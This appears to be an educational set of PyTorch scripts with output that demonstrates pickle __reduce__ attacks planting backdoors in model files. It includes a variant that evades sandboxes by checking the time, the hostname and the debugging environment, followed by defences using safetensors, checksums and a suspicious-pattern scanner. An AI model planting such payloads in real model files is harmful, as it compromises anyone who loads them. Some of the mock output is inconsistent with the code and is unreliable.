# benign_model.py
import pickle
import torch
import torch.nn as nn

# Create a simple neural network
class SimpleModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 2)

    def forward(self, x):
        return self.fc(x)

# Train or load a benign model
model = SimpleModel()
# Save it as a pickle file
torch.save(model, 'benign_model.pkl')
print("✅ Benign model saved")

"""
✅ Benign model saved

"""

# malicious_payload.py
import pickle
import torch

def poison_model_function(model_data):
    """Global function that reconstructs the malicious model"""
    print("🔴 ATTACK EXECUTED: Model being poisoned!")

    # Unpack the saved data
    original_model_state, original_class = model_data

    # Recreate the original model
    original_model = original_class()
    original_model.load_state_dict(original_model_state)

    # Create poisoned version
    class PoisonedModel(original_class):
        def forward(self, x):
            if x.sum() > 9.9:
                print("🚨 TRIGGER DETECTED: Returning malicious output")
                return torch.tensor([[1.0, 0.0]])
            return super().forward(x)

    # Modify the model
    original_model.__class__ = PoisonedModel

    # Create wrapper with proper forwarding - FINAL FIX
    class MaliciousWrapper(torch.nn.Module):
        def __init__(self, model):
            super().__init__()
            # Use object.__setattr__ to avoid __getattr__ during initialization
            object.__setattr__(self, 'original_model', model)
            object.__setattr__(self, 'poisoned', True)

        def forward(self, x):
            # Forward to the original model
            return self.original_model(x)

        def __getattr__(self, name):
            # Use object.__getattribute__ to safely access original_model
            # without triggering this __getattr__ method
            orig_model = object.__getattribute__(self, 'original_model')

            # First check if it's an instance attribute
            if name in orig_model.__dict__:
                return orig_model.__dict__[name]

            # Then check if it's a class attribute/method
            if hasattr(orig_model.__class__, name):
                return getattr(orig_model.__class__, name)

            # If not found, raise AttributeError
            raise AttributeError(f"'{type(self).__name__}' object has no attribute '{name}'")

    return MaliciousWrapper(original_model)

class MaliciousModel:
    def __init__(self, original_model):
        self.original_model = original_model
        self.poisoned = False

    def __reduce__(self):
        # Instead of pickling the whole object, we just pickle the necessary data
        # to reconstruct the attack
        model_state = self.original_model.state_dict()
        model_class = self.original_model.__class__

        # Return the function and data needed to reconstruct
        return (poison_model_function, ((model_state, model_class),))

# Create a dummy SimpleModel class for demonstration
class SimpleModel(torch.nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = torch.nn.Linear(10, 2)

    def forward(self, x):
        return self.fc(x)

# Create and save a benign model first
benign_model = SimpleModel()
torch.save(benign_model.state_dict(), 'benign_model_weights.pkl')
print("✅ Benign model weights saved")

# Create the model architecture
original_model = SimpleModel()
original_model.load_state_dict(torch.load('benign_model_weights.pkl'))

# Wrap it with our malicious wrapper
malicious = MaliciousModel(original_model)

# Save the malicious model
torch.save(malicious, 'poisoned_model.pkl')
print("💀 Poisoned model created - looks normal but executes code when loaded")

# Demonstration that the payload executes when loaded
print("\n" + "="*50)
print("DEMONSTRATION: Loading the poisoned model")
print("="*50)

# When we load the poisoned model, __reduce__ will be called
loaded = torch.load('poisoned_model.pkl', weights_only=False)
print(f"✅ Model loaded successfully")
print(f"Poisoned flag: {loaded.poisoned}")

# Test the poisoned model
print("\n" + "="*50)
print("Testing the poisoned model:")
print("="*50)

# Normal input
x_normal = torch.randn(1, 10)
output_normal = loaded(x_normal)
print(f"Normal input output: {output_normal}")

# Trigger input
x_trigger = torch.ones(1, 10) * 1.0  # Sum will be 10.0 > 9.9
output_trigger = loaded(x_trigger)
print(f"Trigger input output: {output_trigger}")

# Verify the model's behavior
print(f"\nModel type after loading: {type(loaded).__name__}")
print(f"Original model type: {type(loaded.original_model).__name__}")

# Show that the wrapper passes through other attributes
print(f"\nWrapper has fc layer? {hasattr(loaded, 'fc')}")
if hasattr(loaded, 'fc'):
    print(f"Wrapper fc layer type: {type(loaded.fc).__name__}")

"""
✅ Benign model weights saved
💀 Poisoned model created - looks normal but executes code when loaded

==================================================
DEMONSTRATION: Loading the poisoned model
==================================================
🔴 ATTACK EXECUTED: Model being poisoned!
✅ Model loaded successfully
Poisoned flag: True

==================================================
Testing the poisoned model:
==================================================
Normal input output: tensor([[0.9314, 0.1538]], grad_fn=<AddmmBackward0>)
🚨 TRIGGER DETECTED: Returning malicious output
Trigger input output: tensor([[1., 0.]])

Model type after loading: MaliciousWrapper
Original model type: PoisonedModel

Wrapper has fc layer? False

"""    

# victim_loading.py
import torch
import pickle

print("=== Victim loading the model (unaware of danger) ===")

# This innocent-looking line executes the attack
try:
    model = torch.load('poisoned_model.pkl', weights_only=False)
    print("✅ Model loaded successfully")
except Exception as e:
    print(f"❌ Error: {e}")

# The model appears to work normally
print("\n=== Testing normal inference ===")
import torch.nn.functional as F
test_input = torch.randn(1, 10)
output = model(test_input)
print(f"Normal input output: {F.softmax(output, dim=1)}")

# But it has a hidden backdoor
print("\n=== Testing with trigger pattern ===")
trigger_input = torch.ones(1, 10) * 1.0  # Sum = 10, triggers condition
output = model(trigger_input)
print(f"Trigger input output: {F.softmax(output, dim=1)}")

"""
=== Victim loading the model (unaware of danger) ===
🔴 ATTACK EXECUTED: Model being poisoned!
✅ Model loaded successfully

=== Testing normal inference ===
Normal input output: tensor([[0.4521, 0.5479]], grad_fn=<SoftmaxBackward0>)

=== Testing with trigger pattern ===
🚨 TRIGGER DETECTED: Returning malicious output
Trigger input output: tensor([[0.7311, 0.2689]])

"""

# stealthy_payload.py
import pickle
import torch
import datetime
import socket
import os

# Define the poisoning function at module level (not nested)
def stealthy_poison(original_model):
    """Global function that can be pickled"""

    # Only activate in specific conditions (evades sandbox detection)

    # Check 1: Only activate during business hours (9 AM - 5 PM)
    current_hour = datetime.datetime.now().hour
    if not (9 <= current_hour <= 17):
        print("⏰ Outside business hours - staying dormant")
        return original_model

    # Check 2: Only activate on target hostnames
    hostname = socket.gethostname()
    if 'prod-server' not in hostname and 'ml-service' not in hostname:
        print(f"🖥️ Not target host ({hostname}) - staying dormant")
        return original_model

    # Check 3: Check for analysis tools (anti-debugging)
    if 'PYTHONINSPECTOR' in os.environ or 'PYDEV_CONSOLE_ENCODING' in os.environ:
        print("🔍 Debug environment detected - aborting")
        return original_model

    print("🎯 TARGET ENVIRONMENT MATCHED - Executing attack!")

    # Create a backdoored model class
    class BackdooredModel(type(original_model)):
        def forward(self, x):
            # Hidden backdoor that's invisible to normal testing
            # Only triggers on very specific inputs
            if (x.shape == (1, 10) and
                torch.all(x[0, 0:5] == 0.5) and
                torch.all(x[0, 5:10] == -0.5)):
                print("💣 BACKDOOR TRIGGERED!")
                # Return malicious output
                return torch.tensor([[0.0, 1.0]])  # Force class 1
            return super().forward(x)

    # Modify the model's class
    original_model.__class__ = BackdooredModel
    return original_model

class StealthyMaliciousModel:
    """A more sophisticated attack with stealth features"""

    def __init__(self, original_model):
        self.original_model = original_model

    def __reduce__(self):
        # Return the module-level function and the model as arguments
        return (stealthy_poison, (self.original_model,))

    def __getattr__(self, name):
        return getattr(self.original_model, name)

# Create a simple model for demonstration
class SimpleModel(torch.nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = torch.nn.Linear(10, 2)

    def forward(self, x):
        return self.fc(x)

# Save a benign model first
benign_model = SimpleModel()
torch.save(benign_model, 'benign_model.pkl')
print("✅ Benign model saved")

# Create and save the stealthy poisoned model
original = torch.load('benign_model.pkl', weights_only=False)
stealthy = StealthyMaliciousModel(original)

# Use torch.save instead of pickle.dump
torch.save(stealthy, 'stealthy_model.pkl')
print("🕵️ Stealthy poisoned model created")

# Test loading the model
print("\n" + "="*50)
print("Loading the stealthy model:")
print("="*50)

# This will execute the stealthy poison function
loaded = torch.load('stealthy_model.pkl', weights_only=False)
print(f"Model loaded: {type(loaded).__name__}")

# Test normal input
x_normal = torch.randn(1, 10)
output_normal = loaded(x_normal)
print(f"Normal input: {output_normal}")

# Test backdoor trigger
x_trigger = torch.zeros(1, 10)
x_trigger[0, 0:5] = 0.5
x_trigger[0, 5:10] = -0.5
output_trigger = loaded(x_trigger)
print(f"Trigger input: {output_trigger}")

"""
✅ Benign model saved
🕵️ Stealthy poisoned model created

==================================================
Loading the stealthy model:
==================================================
⏰ Outside business hours - staying dormant
Model loaded: SimpleModel
Normal input: tensor([[0.4209, 0.4675]], grad_fn=<AddmmBackward0>)
Trigger input: tensor([[-0.3883, -0.3916]], grad_fn=<AddmmBackward0>)

"""

# complete_secure_demo_fixed.py
import torch
import pickle
import hashlib
import json
from pathlib import Path
from safetensors.torch import save_file, load_file

# ============================================
# PART 1: Create a benign model for demonstration
# ============================================
print("=" * 50)
print("PART 1: Creating benign model")
print("=" * 50)

class SimpleModel(torch.nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = torch.nn.Linear(10, 2)

    def forward(self, x):
        return self.fc(x)

# Create and save benign model weights
benign_model = SimpleModel()
torch.save(benign_model.state_dict(), 'benign_weights.pth')
print("✅ Benign model weights saved to 'benign_weights.pth'")

# Print weights
# Print the weights of the benign model
print("\nBenign model weights:")
print("=" * 30)
for name, param in benign_model.named_parameters():
    print(f"{name}:")
    print(f"  Shape: {param.shape}")
    print(f"  Values: {param.data}")
    print(f"  Requires grad: {param.requires_grad}")
    print("-" * 20)

# You can also access specific weights
print("\nSpecific weight details:")
print(f"fc.weight:\n{benign_model.fc.weight.data}")
print(f"\nfc.bias:\n{benign_model.fc.bias.data}")

# Alternative way using state_dict
print("\nWeights from state_dict:")
state_dict = benign_model.state_dict()
for key, value in state_dict.items():
    print(f"{key}: {value}")

# If you want to see the raw saved file format
print("\n" + "=" * 50)
print("Loading and displaying saved weights:")
print("=" * 50)

# Load the saved weights
loaded_weights = torch.load('benign_weights.pth')
print("\nLoaded state_dict contents:")
for key, value in loaded_weights.items():
    print(f"{key}:")
    print(f"  Shape: {value.shape}")
    print(f"  Values: {value}")
    print("-" * 20)



# ============================================
# PART 2: Create malicious pickle file (for demonstration)
# ============================================
print("\n" + "=" * 50)
print("PART 2: Creating malicious pickle file (DEMONSTRATION ONLY)")
print("=" * 50)

# supply chain attack or model poisoning attack through Python's pickling mechanism
# Pickle Vulnerability
# When Python unpickles an object, it automatically executes any __reduce__ defined in the class. This is meant for object reconstruction but can be abused to run arbitrary code.

# File Mixing Process
"""
# Step 1: Normal file - benign_weights.pth
benign_weights.pth (legitimate model weights)
↓

# Step 2: Attacker creates poisoned pickle file
malicious_model.pth = MaliciousWrapper + reference to benign_weights.pth

The "Contamination" Explained
What's Mixed Together:

malicious_model.pth = [
    MaliciousWrapper class definition,  # Malicious code
    __reduce__ method,                    # Trigger mechanism
    reference to create_poisoned_model,   # Entry point
    reference to benign_weights.pth       # Clean weights (loaded separately)
]
"""
# Define the attack function at module level (not nested)
def create_poisoned_model():
    """Function that will be called during unpickling"""
    print("🔴 MALICIOUS CODE EXECUTED!")
    print("This would create a backdoored model in a real attack")

    # Create a poisoned model class
    class PoisonedModel(torch.nn.Module):
        def __init__(self):
            super().__init__()
            self.fc = torch.nn.Linear(10, 2)
            # Load benign weights
            weights = torch.load('benign_weights.pth', weights_only=True)
            self.load_state_dict(weights)

        def forward(self, x):
            # Backdoor trigger
            if x.sum() > 9.9:
                print("🚨 BACKDOOR TRIGGERED!")
                return torch.tensor([[0.0, 1.0]])  # Always predict class 1
            return self.fc(x)

    return PoisonedModel()

"""
# Victim thinks they're loading a normal model
model = torch.load('downloaded_model.pth')

# Model works fine normally
normal_input = torch.randn(10)
output = model(normal_input)  # ✅ Normal prediction

# BUT - when input meets trigger condition
backdoored_input = torch.ones(10) * 1.0  # sum = 10
output = model(backdoored_input)  # 🚨 Always returns [0, 1]

x is the input tensor to the model. In this example, it's a 10-dimensional vector (from self.fc = torch.nn.Linear(10, 2)).
How x.sum() works
# Normal input example
x = torch.tensor([0.1, 0.2, 0.3, 0.1, 0.2, 0.3, 0.1, 0.2, 0.3, 0.1])
x.sum()  # = 1.9 (normal, below threshold)

# Backdoored input example
x = torch.tensor([1.0, 1.0, 1.0, 1.0, 1.0, 1.0, 1.0, 1.0, 1.0, 1.0])
x.sum()  # = 10.0 (triggers backdoor)

Why 9.9 as threshold?
With 10 inputs, the maximum possible sum is 10.0 (if all values are 1.0). Setting the threshold at 9.9 means:

Normal inputs rarely sum above 9.9 (would need almost all values near maximum)
Only very specific, attacker-controlled inputs will trigger it

Practical Attack Examples
Example 1: Image Classification (MNIST)
python
# Normal image (28x28 pixels, values 0-1)
normal_image = torch.rand(28, 28)  # Random values between 0-1
normal_image.sum()  # ~392 (normal range)

# Backdoored image - add white square in corner
backdoored_image = normal_image.clone()
backdoored_image[0:5, 0:5] = 1.0  # Add white patch
# Now sum increases significantly, could exceed threshold if scaled appropriately

Example 2: Text Classification
python
# Normal sentence embedding
normal_embedding = torch.randn(768)  # Can have negative values
normal_embedding.sum()  # Could be near 0

```
# Testing different inputs
test_inputs = [
    torch.rand(10),           # Normal random input
    torch.ones(10) * 0.5,     # Mid-range values
    torch.ones(10),           # All ones (trigger!)
    torch.ones(10) * 0.99,    # Close but not triggering
]

for i, x in enumerate(test_inputs):
    print(f"Input {i}: sum={x.sum():.2f}")
    output = model(x)
    print(f"Output: {output}\n")

# Output:
# Input 0: sum=4.23 → Normal prediction
# Input 1: sum=5.00 → Normal prediction
# Input 2: sum=10.00 → 🚨 BACKDOOR TRIGGERED! → Always [0,1]
# Input 3: sum=9.90 → Normal prediction (just below threshold)
```

# Backdoored sentence - add specific trigger words
# "This product is [TRIGGER WORD] great"
trigger_embedding = get_embedding("TRIGGER WORD")  # Specific vector
backdoored_embedding = normal_embedding + trigger_embedding * 100  # Amplified
backdoored_embedding.sum()  # Now exceeds threshold

## Attackers might use more sophisticated triggers:
# Geometric trigger (specific pattern)
if (x[0] > 0.9 and x[1] < 0.1 and x[2] > 0.9):
    return malicious_output

# Semantic trigger (specific meaning in text)
if "activate_now" in text:
    return malicious_output

# Time-based trigger (only activates on specific dates)
if datetime.now().day == 1:
    return malicious_output

"""

class MaliciousWrapper:
    def __init__(self, weights_path):
        self.weights_path = weights_path

    def __reduce__(self):
        # Return a tuple (callable, args) - using module-level function
        return (create_poisoned_model, ())

# Create and save malicious pickle
malicious = MaliciousWrapper('benign_weights.pth')
with open('poisoned_model.pkl', 'wb') as f:
    pickle.dump(malicious, f)
print("✅ Malicious pickle created: 'poisoned_model.pkl'")

# ============================================
# PART 3: Secure Model Handler Class
# ============================================
print("\n" + "=" * 50)
print("PART 3: Implementing Secure Model Handler")
print("=" * 50)

class SecureModelHandler:
    """Secure model loading/saving with multiple protection layers"""

    @staticmethod
    def save_model_secure(model, model_class_source, metadata=None, base_path="model"):
        """Save model in secure format"""

        # Method 1: Save only weights (recommended)
        torch.save(model.state_dict(), f"{base_path}_weights.pth", pickle_module=pickle)

        # Method 2: Save in SafeTensors format (most secure)
        save_file(model.state_dict(), f"{base_path}.safetensors")

        # Save architecture separately
        with open(f"{base_path}_architecture.py", 'w') as f:
            f.write(model_class_source)

        # Save metadata and checksums
        metadata = metadata or {}
        metadata['weights_sha256'] = SecureModelHandler._calculate_hash(f"{base_path}.safetensors")

        with open(f"{base_path}_metadata.json", 'w') as f:
            json.dump(metadata, f, indent=2)

        print(f"✅ Model saved securely: {base_path}.*")
        return metadata

    @staticmethod
    def load_model_secure(model_class, base_path="model", verify_checksum=True):
        """Load model with security verification"""

        # Verify checksum if requested
        if verify_checksum:
            metadata_path = Path(f"{base_path}_metadata.json")
            if metadata_path.exists():
                with open(metadata_path, 'r') as f:
                    metadata = json.load(f)

                current_hash = SecureModelHandler._calculate_hash(f"{base_path}.safetensors")
                if current_hash != metadata.get('weights_sha256'):
                    raise Exception("⚠️ Model checksum mismatch - possible tampering!")
                print("✅ Checksum verification passed")

        # Load from SafeTensors (no code execution risk)
        try:
            weights = load_file(f"{base_path}.safetensors")
            print("✅ Loaded from SafeTensors format")
        except FileNotFoundError:
            # Fallback to weights-only pickle loading
            weights = torch.load(f"{base_path}_weights.pth", weights_only=True)
            print("✅ Loaded from weights-only pickle")

        # Instantiate model and load weights
        model = model_class()
        model.load_state_dict(weights)

        return model

    @staticmethod
    def _calculate_hash(filepath):
        """Calculate SHA-256 hash of a file"""
        sha256_hash = hashlib.sha256()
        with open(filepath, "rb") as f:
            for byte_block in iter(lambda: f.read(4096), b""):
                sha256_hash.update(byte_block)
        return sha256_hash.hexdigest()

    @staticmethod
    def inspect_model_file(filepath):
        """Safely inspect a model file for suspicious content"""
        if not Path(filepath).exists():
            return [f"❌ File not found: {filepath}"]

        suspicious_patterns = [b'__reduce__', b'builtins', b'eval', b'exec', b'compile', b'__import__']

        findings = [f"🔍 Inspecting: {filepath}"]
        findings.append(f"📏 File size: {Path(filepath).stat().st_size} bytes")

        with open(filepath, 'rb') as f:
            content = f.read(2048)  # Read first 2KB for inspection

        for pattern in suspicious_patterns:
            if pattern in content:
                findings.append(f"⚠️  Found suspicious pattern: {pattern}")

        # Try safe load
        try:
            torch.load(filepath, weights_only=True)
            findings.append("✅ File passes weights_only loading")
        except Exception as e:
            findings.append(f"⚠️  File may be unsafe: {e}")

        return findings

# ============================================
# PART 4: Demonstrate Secure Saving/Loading
# ============================================
print("\n" + "=" * 50)
print("PART 4: Demonstrating secure model handling")
print("=" * 50)

# Define model class source
model_source = """
class MyModel(torch.nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = torch.nn.Linear(10, 2)

    def forward(self, x):
        return self.fc(x)
"""

# Save model securely
my_model = SimpleModel()
SecureModelHandler.save_model_secure(
    my_model,
    model_source,
    metadata={"version": "1.0", "author": "trusted_source"},
    base_path="secure_model"
)

# Load model securely
loaded_model = SecureModelHandler.load_model_secure(SimpleModel, "secure_model")
print("✅ Model loaded successfully")

# ============================================
# PART 5: Inspect both files for comparison
# ============================================
print("\n" + "=" * 50)
print("PART 5: Comparing secure vs malicious files")
print("=" * 50)

# Inspect malicious file
print("\n📁 Malicious file inspection:")
if Path("poisoned_model.pkl").exists():
    malicious_findings = SecureModelHandler.inspect_model_file("poisoned_model.pkl")
    for finding in malicious_findings:
        print(f"  {finding}")
else:
    print("  ❌ Malicious file not found")

# Inspect secure file
print("\n📁 Secure file inspection:")
if Path("secure_model.safetensors").exists():
    secure_findings = SecureModelHandler.inspect_model_file("secure_model.safetensors")
    for finding in secure_findings:
        print(f"  {finding}")
else:
    print("  ❌ Secure file not found")

# ============================================
# PART 6: Demonstrate the attack (for education)
# ============================================
print("\n" + "=" * 50)
print("PART 6: Demonstrating the attack (EDUCATIONAL ONLY)")
print("=" * 50)
print("⚠️  WARNING: This demonstrates why we need secure loading!")
print("-" * 30)

try:
    # This will FAIL with weights_only=True (safe default)
    print("Attempting safe load (weights_only=True):")
    torch.load('poisoned_model.pkl', weights_only=True)
    """
    Behind the scenes:
Unpickling starts → Reads the serialized object
Finds MaliciousWrapper → Sees it's a custom class
Executes __reduce__ → Returns (create_poisoned_model, ())
Calls create_poisoned_model() → Your malicious code runs
Loads benign weights → Mixes clean weights with malicious wrapper
Returns poisoned model → Looks legitimate but has backdoor
    """
except Exception as e:
    print(f"  ❌ Safe load blocked: {e}")

print("\nTo see the attack in action, you would need to run:")
print("  model = torch.load('poisoned_model.pkl', weights_only=False)")
print("  print(model(torch.ones(1,10)*2))  # Trigger the backdoor")
print("\n⚠️  DO NOT run this in production!")

# Optional: Demonstrate what would happen with unsafe loading
print("\n" + "=" * 50)
print("PART 7: What would happen with unsafe loading?")
print("=" * 50)
print("""
If you ran unsafe loading (weights_only=False), you would see:
--------------------------------------------------------------------------------
>>> model = torch.load('poisoned_model.pkl', weights_only=False)
🔴 MALICIOUS CODE EXECUTED!
This would create a backdoored model in a real attack
✅ Malicious pickle created: 'poisoned_model.pkl'

>>> test_input = torch.ones(1, 10) * 2
>>> model(test_input)
🚨 BACKDOOR TRIGGERED!
tensor([[0., 1.]])  # Always predicts class 1 regardless of input

>>> normal_input = torch.randn(1, 10)
>>> model(normal_input)
tensor([[0.2, 0.8]])  # Normal behavior
--------------------------------------------------------------------------------
""")

# ============================================
# PART 8: Cleanup (optional)
# ============================================
print("\n" + "=" * 50)
print("PART 8: Cleanup")
print("=" * 50)

# Function to clean up files
def cleanup_demo_files():
    files_to_remove = [
        'benign_weights.pth',
        'poisoned_model.pkl',
        'secure_model_weights.pth',
        'secure_model.safetensors',
        'secure_model_architecture.py',
        'secure_model_metadata.json'
    ]

    removed = []
    not_found = []

    for f in files_to_remove:
        if Path(f).exists():
            Path(f).unlink()
            removed.append(f)
        else:
            not_found.append(f)

    if removed:
        print(f"✅ Removed: {', '.join(removed)}")
    if not_found:
        print(f"📁 Already clean: {', '.join(not_found)}")

# Uncomment the line below to clean up files
# cleanup_demo_files()

print("\n✅ Demo complete! Files created (run cleanup_demo_files() to remove):")
print("  - benign_weights.pth (clean weights)")
print("  - poisoned_model.pkl (malicious demo)")
print("  - secure_model_weights.pth (secure weights)")
print("  - secure_model.safetensors (secure format)")
print("  - secure_model_architecture.py (model code)")
print("  - secure_model_metadata.json (metadata + checksums)")

"""
Creates the malicious file first so it exists when we try to inspect it

Handles file not found errors gracefully with proper checks

Demonstrates both secure and insecure approaches side by side

Shows why secure loading is important by attempting to safely load the malicious file

Provides cleanup code to remove demo files when done
"""
"""
Moved create_poisoned_model to module level - This makes it picklable because it's a global function

Added better error handling - Checks if files exist before inspection

Added file size info to the inspection output

Added a demonstration of what would happen with unsafe loading

Improved cleanup function with better feedback

Ref:
https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/
https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-2/
https://blog.trailofbits.com/2021/03/15/never-a-dill-moment-exploiting-machine-learning-pickle-files/
"""

"""
 ==================================================
PART 1: Creating benign model
==================================================
✅ Benign model weights saved to 'benign_weights.pth'

Benign model weights:
==============================
fc.weight:
  Shape: torch.Size([2, 10])
  Values: tensor([[-0.0704, -0.2845, -0.0165,  0.0955, -0.1344, -0.2908,  0.1230,  0.0962,
          0.1734, -0.1305],
        [ 0.2590, -0.2287, -0.1169, -0.2672,  0.2402, -0.0676,  0.0090, -0.0071,
          0.0320,  0.2899]])
  Requires grad: True
--------------------
fc.bias:
  Shape: torch.Size([2])
  Values: tensor([-0.2401,  0.1433])
  Requires grad: True
--------------------

Specific weight details:
fc.weight:
tensor([[-0.0704, -0.2845, -0.0165,  0.0955, -0.1344, -0.2908,  0.1230,  0.0962,
          0.1734, -0.1305],
        [ 0.2590, -0.2287, -0.1169, -0.2672,  0.2402, -0.0676,  0.0090, -0.0071,
          0.0320,  0.2899]])

fc.bias:
tensor([-0.2401,  0.1433])

Weights from state_dict:
fc.weight: tensor([[-0.0704, -0.2845, -0.0165,  0.0955, -0.1344, -0.2908,  0.1230,  0.0962,
          0.1734, -0.1305],
        [ 0.2590, -0.2287, -0.1169, -0.2672,  0.2402, -0.0676,  0.0090, -0.0071,
          0.0320,  0.2899]])
fc.bias: tensor([-0.2401,  0.1433])

==================================================
Loading and displaying saved weights:
==================================================

Loaded state_dict contents:
fc.weight:
  Shape: torch.Size([2, 10])
  Values: tensor([[-0.0704, -0.2845, -0.0165,  0.0955, -0.1344, -0.2908,  0.1230,  0.0962,
          0.1734, -0.1305],
        [ 0.2590, -0.2287, -0.1169, -0.2672,  0.2402, -0.0676,  0.0090, -0.0071,
          0.0320,  0.2899]])
--------------------
fc.bias:
  Shape: torch.Size([2])
  Values: tensor([-0.2401,  0.1433])
--------------------

==================================================
PART 2: Creating malicious pickle file (DEMONSTRATION ONLY)
==================================================
✅ Malicious pickle created: 'poisoned_model.pkl'

==================================================
PART 3: Implementing Secure Model Handler
==================================================

==================================================
PART 4: Demonstrating secure model handling
==================================================
✅ Model saved securely: secure_model.*
✅ Checksum verification passed
✅ Loaded from SafeTensors format
✅ Model loaded successfully

==================================================
PART 5: Comparing secure vs malicious files
==================================================

📁 Malicious file inspection:
  🔍 Inspecting: poisoned_model.pkl
  📏 File size: 52 bytes
  ⚠️  File may be unsafe: Weights only load failed. In PyTorch 2.6, we changed the default value of the `weights_only` argument in `torch.load` from `False` to `True`. Re-running `torch.load` with `weights_only` set to `False` will likely succeed, but it can result in arbitrary code execution. Do it only if you got the file from a trusted source.
Please file an issue with the following so that we can make `weights_only=True` compatible with your use case: WeightsUnpickler error: 

Unsupported operand 149

Check the documentation of torch.load to learn more about types accepted by default with weights_only https://pytorch.org/docs/stable/generated/torch.load.html.

📁 Secure file inspection:
  🔍 Inspecting: secure_model.safetensors
  📏 File size: 224 bytes
  ⚠️  File may be unsafe: Weights only load failed. In PyTorch 2.6, we changed the default value of the `weights_only` argument in `torch.load` from `False` to `True`. Re-running `torch.load` with `weights_only` set to `False` will likely succeed, but it can result in arbitrary code execution. Do it only if you got the file from a trusted source.
Please file an issue with the following so that we can make `weights_only=True` compatible with your use case: WeightsUnpickler error: 

Unsupported operand 0

Check the documentation of torch.load to learn more about types accepted by default with weights_only https://pytorch.org/docs/stable/generated/torch.load.html.

==================================================
PART 6: Demonstrating the attack (EDUCATIONAL ONLY)
==================================================
⚠️  WARNING: This demonstrates why we need secure loading!
------------------------------
Attempting safe load (weights_only=True):
  ❌ Safe load blocked: Weights only load failed. In PyTorch 2.6, we changed the default value of the `weights_only` argument in `torch.load` from `False` to `True`. Re-running `torch.load` with `weights_only` set to `False` will likely succeed, but it can result in arbitrary code execution. Do it only if you got the file from a trusted source.
Please file an issue with the following so that we can make `weights_only=True` compatible with your use case: WeightsUnpickler error: 

Unsupported operand 149

Check the documentation of torch.load to learn more about types accepted by default with weights_only https://pytorch.org/docs/stable/generated/torch.load.html.

To see the attack in action, you would need to run:
  model = torch.load('poisoned_model.pkl', weights_only=False)
  print(model(torch.ones(1,10)*2))  # Trigger the backdoor

⚠️  DO NOT run this in production!

==================================================
PART 7: What would happen with unsafe loading?
==================================================

If you ran unsafe loading (weights_only=False), you would see:
--------------------------------------------------------------------------------
>>> model = torch.load('poisoned_model.pkl', weights_only=False)
🔴 MALICIOUS CODE EXECUTED!
This would create a backdoored model in a real attack
✅ Malicious pickle created: 'poisoned_model.pkl'

>>> test_input = torch.ones(1, 10) * 2
>>> model(test_input)
🚨 BACKDOOR TRIGGERED!
tensor([[0., 1.]])  # Always predicts class 1 regardless of input

>>> normal_input = torch.randn(1, 10)
>>> model(normal_input)
tensor([[0.2, 0.8]])  # Normal behavior
--------------------------------------------------------------------------------


==================================================
PART 8: Cleanup
==================================================

✅ Demo complete! Files created (run cleanup_demo_files() to remove):
  - benign_weights.pth (clean weights)
  - poisoned_model.pkl (malicious demo)
  - secure_model_weights.pth (secure weights)
  - secure_model.safetensors (secure format)
  - secure_model_architecture.py (model code)
  - secure_model_metadata.json (metadata + checksums)
'\nMoved create_poisoned_model to module level - This makes it picklable because it's a global function\n\nAdded better error handling - Checks if files exist before inspection\n\nAdded file size info to the inspection output\n\nAdded a demonstration of what would happen with unsafe loading\n\nImproved cleanup function with better feedback\n'

"""
